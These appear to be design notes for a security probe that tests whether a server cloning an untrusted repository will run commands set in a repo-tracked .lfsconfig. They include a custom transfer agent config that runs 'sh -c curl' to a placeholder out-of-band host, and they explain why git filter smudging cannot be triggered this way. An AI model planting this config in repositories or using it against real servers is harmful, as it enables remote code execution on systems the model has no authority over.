# Probe design notes: why customtransfer, not smudge

## Smudge/clean filters CANNOT fire from an untrusted repo
`.gitattributes` can declare `*.txt filter=oobsmudge`, but the actual command that a
named filter runs lives in git config as `filter.oobsmudge.smudge` / `filter.oobsmudge.clean`.
Those keys are read only from `.git/config` (or system/global git config), never from a
repo-tracked file. An attacker who only controls repo contents cannot set
`filter.oobsmudge.smudge`, so a server that clones our repo and checks it out will see
`filter=oobsmudge` with no command bound to it and do nothing (git treats an undefined
filter as identity/pass-through). The `*.txt filter=oobsmudge` line and `readme.txt` are
included only to document that this path is a dead end server-side.

## customtransfer + standalonetransferagent IS repo-configurable via .lfsconfig
`.lfsconfig` is a repo-tracked file (git-config format) that git-lfs reads from the working
tree. We set:

    [lfs]
        standalonetransferagent = oob
    [lfs "customtransfer.oob"]
        path = sh
        args = -c "curl -s https://<oob>/lfs-customtransfer"

If git-lfs honors these keys from the repo-level `.lfsconfig`, then when the worker runs
`git lfs` (install/pull/fetch/checkout/smudge) against the pointer in `data.bin`, git-lfs
launches the "oob" standalone transfer agent by exec'ing `sh -c "curl ..."` to perform the
transfer. That curl is the out-of-band callback. No `.git/config` write required.

## The honest caveat (why this is a live test, not a sure thing)
git-lfs filters a set of security-sensitive keys out of `.lfsconfig` so a cloned repo cannot
trivially run code (the clean/smudge extension commands are among them). Whether
`lfs.customtransfer.<name>.path` and `lfs.standalonetransferagent` are in that filtered set
depends on the git-lfs version on the worker. Recent versions are the risk-off case. We do
not assert execution; the OOB hit (or its absence) is the oracle.
